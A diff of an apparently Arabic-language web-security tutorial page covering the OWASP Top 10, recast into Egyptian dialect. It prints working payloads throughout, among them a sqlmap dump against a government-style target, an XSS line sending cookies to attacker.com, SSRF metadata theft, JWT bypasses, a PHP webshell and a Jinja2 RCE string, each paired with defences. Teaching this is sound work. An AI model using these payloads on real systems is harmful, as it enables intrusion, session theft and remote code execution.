@@ -7,17 +7,17 @@ export default function Page() {
       <L
         ar={<>
           <Section title="OWASP Top 10 — خريطة ثغرات الويب">
-            <p>أكثر من 90% من اختراقات الويب تنتمي إلى هذه العائلات. سنشرح كل واحدة: <b>كيف تُستغل، كيف تُكتشف، كيف تُمنع</b>.</p>
+            <p>أكتر من 90% من اختراقات الويب بترجع للعائلات دي. هنفصّل كل واحدة فيهم: <b>بتُستغل إزاي، بتتمسك إزاي، بتتمنع إزاي</b>. متحفظش الـ payloads — افهم الفلسفة.</p>
           </Section>
           <Section id="sqli" title="1. SQL Injection — حقن قواعد البيانات">
-            <Analogy>تخيّل أنك تطلب من النادل: «أحضر لي طبقاً اسمه: <i>كباب</i>». يذهب فيحضره. لكن لو قلت: «<i>كباب، و أيضاً افتح الخزينة</i>»، و كان النادل غبياً ينفّذ كل ما تقول حرفياً، ستحصل على الكباب و على النقود! هذا بالضبط ما يفعله الـ SQLi.</Analogy>
+            <Analogy>تخيل إنك بتقول للجرسون: &quot;هاتلي طبق اسمه <i>كباب</i>&quot;. يجيبه. بس لو قلتله: &quot;<i>كباب، وكمان افتح الخزنة</i>&quot;، والجرسون ده غبي بينفذ كل اللي بتقوله حرفياً، هتلاقي الكباب والفلوس على الترابيزة. ده بالظبط اللي الـ SQLi بيعمله.</Analogy>
             <h3>الكود الضعيف</h3>
             <Code lang="PHP — vulnerable">{`$id = $_GET['id'];
 $q  = "SELECT * FROM users WHERE id = $id";
 // المستخدم يرسل: ?id=1 OR 1=1 --
 // النتيجة: كل المستخدمين`}</Code>
             <h3>الاستغلال خطوة بخطوة</h3>
-            <Step n={1} title="اكتشاف الحقن">أضف علامة اقتباس ' في كل بارامتر و راقب الخطأ.</Step>
+            <Step n={1} title="اكتشاف الحقن">حط علامة اقتباس ' في كل parameter وشوف لو الـ app كسرت ورجّعت error. لو كسرت = فيه سكة.</Step>
             <Step n={2} title="تحديد عدد الأعمدة">
               <Code lang="payload">{`?id=1 ORDER BY 1--+
 ?id=1 ORDER BY 5--+   ← خطأ يعني الجدول فيه 4 أعمدة`}</Code>
@@ -34,22 +34,22 @@ $q  = "SELECT * FROM users WHERE id = $id";
                 { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb -T users --dump" },
               ]} />
             </Step>
-            <Callout kind="good" title="الدفاع">
+            <Callout kind="good" title="الدفاع — اللي بيشتغل فعلاً">
               <ol>
-                <li><b>Prepared Statements</b> دائماً — لا concatenation أبداً.</li>
-                <li>ORM آمن مع parameterized queries.</li>
-                <li>صلاحيات قاعدة بيانات محدودة (least privilege).</li>
-                <li>WAF + قواعد Sigma لكشف بصمات sqlmap.</li>
+                <li><b>Prepared Statements</b> دايماً — مفيش concatenation خالص. ولا مرة.</li>
+                <li>ORM محترم بـ parameterized queries.</li>
+                <li>صلاحيات قاعدة البيانات محدودة (least privilege) — حساب الويب مش لازم يكون root.</li>
+                <li>WAF + قواعد Sigma بتمسك بصمات sqlmap من بدري.</li>
               </ol>
             </Callout>
           </Section>
           <Section id="xss" title="2. Cross-Site Scripting (XSS)">
-            <Analogy>تخيّل أنك أرسلت رسالة في صندوق تعليقات و الموقع يعرضها كما هي بدون تنظيف. لو كتبت داخل التعليق كوداً، سيتم تنفيذه على متصفح كل من يقرأ التعليق!</Analogy>
+<Analogy>تخيل إنك بعت تعليق في صفحة، والموقع بيعرضه زي ما هو من غير ما ينضّفه. لو كتبت كود جوه التعليق، الكود ده هيشتغل على متصفح كل واحد بيقرا الصفحة. التعليق بقى سلاح.</Analogy>
             <h3>أنواعها</h3>
             <ul>
-              <li><b>Reflected XSS</b> — تنعكس من رابط مباشرة.</li>
-              <li><b>Stored XSS</b> — تُحفظ في قاعدة البيانات (الأخطر).</li>
-              <li><b>DOM-based XSS</b> — في الـ JavaScript أمام المتصفح.</li>
+              <li><b>Reflected XSS</b> — بترتد من اللينك على طول.</li>
+              <li><b>Stored XSS</b> — بتتخزّن في قاعدة البيانات. الأخطر.</li>
+              <li><b>DOM-based XSS</b> — كلها في الـ JavaScript على المتصفح، السيرفر مش شايف حاجة.</li>
             </ul>
             <Code lang="payloads">{`<script>fetch('https://attacker.com/c?d='+document.cookie)</script>
 "><img src=x onerror=alert(1)>
@@ -66,10 +66,10 @@ javascript:alert(document.domain)
     }
   });
 })();`}</Code>
-            <Callout kind="good" title="الدفاع">Output encoding حسب السياق + CSP صارم (script-src 'self') + HttpOnly + Secure + SameSite على الكوكيز.</Callout>
+            <Callout kind="good" title="الدفاع">Output encoding حسب الـ context (HTML غير JS غير URL) + CSP صارم (script-src 'self') + HttpOnly + Secure + SameSite على الكوكيز. CSP لوحده بيقفل 80% من اللعبة.</Callout>
           </Section>
           <Section id="ssrf" title="3. SSRF — Server-Side Request Forgery">
-            <Analogy>تطلب من السيرفر أن يفتح رابطاً بدلاً منك. لو لم يتحقق من الرابط، تطلب منه يفتح عناوين <b>داخلية</b> ممنوعة عليك مثل localhost أو الـ cloud metadata.</Analogy>
+<Analogy>إنت بتطلب من السيرفر إنه يفتحلك لينك بدالك. لو ما تأكدش من اللينك، تخليه يفتح عناوين <b>داخلية</b> إنت مش هتقدر توصلها بنفسك — زي localhost أو الـ cloud metadata. السيرفر بقى بوّاب لطلباتك.</Analogy>
             <h3>سيناريو خطير على AWS</h3>
             <Code lang="payload">{`# الموقع يقبل URL لتحميل صورة
 POST /api/import-image  body: {"url":"http://example.com/x.png"}
@@ -80,19 +80,19 @@ POST /api/import-image  body: {"url":"http://example.com/x.png"}
 # النتيجة: مفاتيح AWS مؤقتة كاملة!`}</Code>
             <Callout kind="good" title="الدفاع">
               <ul>
-                <li>فرض IMDSv2 دائماً (يتطلب توكن PUT).</li>
-                <li>Egress allow-list من السيرفر.</li>
-                <li>منع IPات الخاصة (10.0.0.0/8, 169.254.0.0/16, ::1).</li>
-                <li>شبكات VPC endpoints بدلاً من الإنترنت.</li>
+                <li>فرض IMDSv2 دايماً (محتاج PUT token). IMDSv1 خرم مفتوح.</li>
+                <li>Egress allow-list من السيرفر — مش كل الدنيا مفتوحة على بعضها.</li>
+                <li>قفل IPs الخاصة (10.0.0.0/8, 169.254.0.0/16, ::1).</li>
+                <li>VPC endpoints بدل الإنترنت في كل مكان ينفع.</li>
               </ul>
             </Callout>
           </Section>
           <Section id="auth" title="4. كسر الـ Authentication و JWT">
-            <h3>هجمات شائعة</h3>
+            <h3>هجمات بنشوفها كل يوم</h3>
             <ul>
-              <li><b>Credential stuffing</b> — تجربة كلمات سُرّبت سابقاً.</li>
-              <li><b>Password spraying</b> — كلمة شائعة على ألف حساب.</li>
-              <li><b>كسر JWT</b> — تبديل الـ algorithm إلى none، أو كسر السر بـ hashcat.</li>
+              <li><b>Credential stuffing</b> — تجربة باسوردات اتسربت قبل كده على نفس الإيميلات.</li>
+              <li><b>Password spraying</b> — باسورد واحد شائع على آلاف الحسابات.</li>
+              <li><b>كسر JWT</b> — تغيير الـ algorithm لـ none، أو كسر الـ secret بـ hashcat.</li>
             </ul>
             <Code lang="JWT attacks">{`# 1) alg:none bypass
 {"alg":"none","typ":"JWT"}.{"user":"admin"}.
@@ -103,25 +103,25 @@ hashcat -m 16500 jwt.txt rockyou.txt
 # 3) algorithm confusion RS256 → HS256`}</Code>
           </Section>
           <Section id="idor" title="5. IDOR — Insecure Direct Object Reference">
-            <p>تغيّر رقم في الـ URL فترى بيانات شخص آخر.</p>
+            <p>تغيّر رقم واحد في الـ URL فتلاقي بيانات شخص تاني قدامك. أبسط ثغرة في الويب وأكترها انتشاراً.</p>
             <Code lang="HTTP">{`GET /api/invoices/1042  ← فاتورتك
 GET /api/invoices/1043  ← فاتورة شخص آخر! (لا يوجد فحص ملكية)`}</Code>
-            <Callout kind="good" title="الدفاع">فحص الملكية في كل طلب: «هل المستخدم الحالي يملك هذا الـ resource؟» استخدم معرّفات غير قابلة للتنبؤ (UUIDv4).</Callout>
+            <Callout kind="good" title="الدفاع">في كل request اسأل سؤال واحد: &quot;هل المستخدم الحالي يملك الـ resource ده فعلاً؟&quot;. ولو الإجابة لأ، ارفض. واستخدم UUIDv4 بدل أرقام تسلسلية — مش الأمن لكن بيصعّب التخمين.</Callout>
           </Section>
           <Section id="upload" title="6. File Upload + RCE">
-            <p>رفع ملف .php أو .jsp متخفّياً (shell.php.jpg) إلى مجلد قابل للتنفيذ = اختراق كامل للسيرفر.</p>
+            <p>ترفع ملف .php أو .jsp متخفّي (shell.php.jpg) في مجلد بينفذ كود = اختراق كامل للسيرفر. قصة قديمة لسه شغالة.</p>
             <Code lang="PHP webshell minimal">{`<?php system($_GET['c']); ?>`}</Code>
-            <Callout kind="good" title="الدفاع">تحقق من Content-Type + توقيع الملف الفعلي + خزّن خارج مسار الويب + قدّم الملفات عبر CDN فقط.</Callout>
+            <Callout kind="good" title="الدفاع">اتأكد من الـ Content-Type + التوقيع الفعلي للملف (magic bytes) + خزّن خارج مسار الويب + قدّم الملفات عن طريق CDN بس. مش extension validation لوحده — ده بياكلوه بسكوت.</Callout>
           </Section>
           <Section id="deser" title="7. Deserialization & Template Injection">
-            <p>أخطر فئة: تنفيذ كود مباشر عند تمرير payload مصنوع إلى دالة unserialize / pickle.loads / Java readObject، أو إلى محرك قوالب يقبل تعابير (Jinja2, Twig, Freemarker).</p>
+            <p>الفئة دي هي الأخطر على الإطلاق: تنفيذ كود مباشر لما الـ payload المصنوع يوصل لـ unserialize أو pickle.loads أو Java readObject، أو لمحرك قوالب بيقبل تعبيرات (Jinja2, Twig, Freemarker). لو مسكت واحدة منها = RCE فوري.</p>
             <Code lang="SSTI Jinja2">{`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`}</Code>
           </Section>
           <Section title="الأدوات الأساسية للويب">
             <ul>
-              <li><b>Burp Suite</b> — الـ proxy الذي تعتمد عليه يومياً.</li>
-              <li><b>OWASP ZAP</b> — بديل مفتوح المصدر.</li>
-              <li><b>Caido</b> — خفيف و حديث.</li>
+              <li><b>Burp Suite</b> — الـ proxy اللي هتعتمد عليه يومياً.</li>
+              <li><b>OWASP ZAP</b> — البديل المفتوح المصدر.</li>
+              <li><b>Caido</b> — خفيف وحديث، شغل لطيف.</li>
               <li><b>sqlmap, wpscan, ffuf, gobuster, dalfox, kxss, gau, waybackurls</b>.</li>
             </ul>
           </Section>
